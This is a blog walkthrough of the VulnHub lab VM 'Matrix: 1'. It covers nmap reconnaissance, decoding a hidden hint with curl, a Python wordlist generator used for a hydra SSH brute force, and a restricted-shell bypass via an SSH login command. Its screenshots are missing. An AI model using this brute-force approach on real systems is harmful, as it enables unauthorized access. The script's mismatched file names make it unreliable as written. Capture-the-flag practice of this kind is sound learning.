@@ -1,0 +1,128 @@
+
+
+It means buckle your seatbelt, Dorothy because Kansas is going bye bye.
+
+
+
+
+
+
+
+
+Bernie Lim
+
+
+
+
+A security enthusiast. Likes cats.
+
+
+
+
+
+26 Nov 2018
+
+
+
+3 min read
+
+
+0 Comments
+
+
+
+
+
+This post documents the complete walkthrough of Matrix: 1, a boot2root VM created by Ajay Verma, and hosted at VulnHub. If you are uncomfortable with spoilers, please stop reading now.
+
+Background
+This is your last chance. After this, there is no turning back. You take the blue pill - the story ends, you wake up in your bed and believe whatever you want to believe. You take the red pill - you stay in Wonderland and I show you how deep the rabbit-hole goes.
+Information Gathering
+Letâs start with a nmap scan to establish the available services in the host.
+# nmap -n -v -Pn -p- -A --reason -oN nmap.txt 192.168.30.129
+...
+PORT      STATE SERVICE REASON         VERSION
+22/tcp    open  ssh     syn-ack ttl 64 OpenSSH 7.7 (protocol 2.0)
+| ssh-hostkey:
+|   2048 9c:8b:c7:7b:48:db:db:0c:4b:68:69:80:7b:12:4e:49 (RSA)
+|   256 49:6c:23:38:fb:79:cb:e0:b3:fe:b2:f4:32:a2:70:8e (ECDSA)
+|_  256 53:27:6f:04:ed:d1:e7:81:fb:00:98:54:e6:00:84:4a (ED25519)
+80/tcp    open  http    syn-ack ttl 64 SimpleHTTPServer 0.6 (Python 2.7.14)
+| http-methods:
+|_  Supported Methods: GET HEAD
+|_http-server-header: SimpleHTTP/0.6 Python/2.7.14
+|_http-title: Welcome in Matrix
+31337/tcp open  http    syn-ack ttl 64 SimpleHTTPServer 0.6 (Python 2.7.14)
+| http-methods:
+|_  Supported Methods: GET HEAD
+|_http-server-header: SimpleHTTP/0.6 Python/2.7.14
+|_http-title: Welcome in Matrix
+
+nmap finds 22/tcp, 80/tcp and 31337/tcp open. The interesting bit is that both http servers are Pythonâs SimpleHTTPServer.
+Cypherâs Message
+Cypher left a message in the HTML source code of 31337/tcp.
+# curl -s 192.168.30.129:31337 | sed '71!d' | sed -r 's/\s+//' | cut -d'&gt;' -f2 | cut -d'&lt;' -f1 | base64 -d &amp;&amp; echo
+echo "Then you'll see, that it is not the spoon that bends, it is only yourself. " &gt; Cypher.matrix
+
+The message is redirected to a file. Perhaps the file is present?
+
+
+
+What do we have here?
+
+
+
+Brainfuck!
+Using an online interpreter, one can easily decipher (no pun intended) it, in which case, the message is:
+You can enter into matrix as guest, with password k1ll0rXX Note: Actually, I forget last two characters so I have replaced with XX try your luck and find correct string of password.
+
+Entering the Matrix
+From the message, itâs clear that we need to brute-force our way into the Matrix. The tool of choice here is hydra. Itâs equally easy to use Python to generate a password list for hydraâs use.
+genme.py
+import itertools
+import os
+import string
+
+charset  = string.ascii_letters + string.digits
+killer   = 'k1ll0r'
+password = open('passwords.txt', 'w')
+string   = ''
+
+for (a, b) in itertools.product(charset, repeat=2):
+    string += killer + a + b + '\n'
+
+password.write(string)
+password.close()
+
+os.system('sort -R &lt; password.txt &gt; pass.txt &amp;&amp; rm passwords.txt &amp;&amp; mv pass.txt passwords.txt')
+
+The random sort at the end is for good measureâhopefully luck is on our sideâand we donât have go all the way to the end to get our password.
+Time to give it a shot.
+
+
+
+Awesome. Took less than a minute.
+Bypass Restricted Shell
+I give to you a restricted shell. Damn.
+
+
+
+No sweat. We can log out and log back in again, making use of the fact that SSH executes command upon login like so.
+
+
+
+The surprise doesnât end here.
+
+
+
+I guess itâs over.
+
+
+
+Whatâs the Flag?
+Getting the flag is one command away.
+
+
+
+
+
